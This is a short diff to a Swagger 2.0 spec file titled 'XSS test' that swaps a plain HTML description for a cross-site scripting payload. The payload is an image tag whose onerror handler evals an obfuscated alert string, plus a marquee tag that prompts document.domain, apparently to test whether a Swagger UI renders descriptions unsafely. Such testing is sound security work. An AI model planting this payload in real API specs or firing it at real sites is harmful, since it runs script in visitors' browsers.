@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description: <h1>test</h1><h2>teee</h2>
+  description: <image href=x src=x onerror=eval('al'+'er'+'t()')>”><marquee onstart=prompt(document.domain)>
   version: production
 
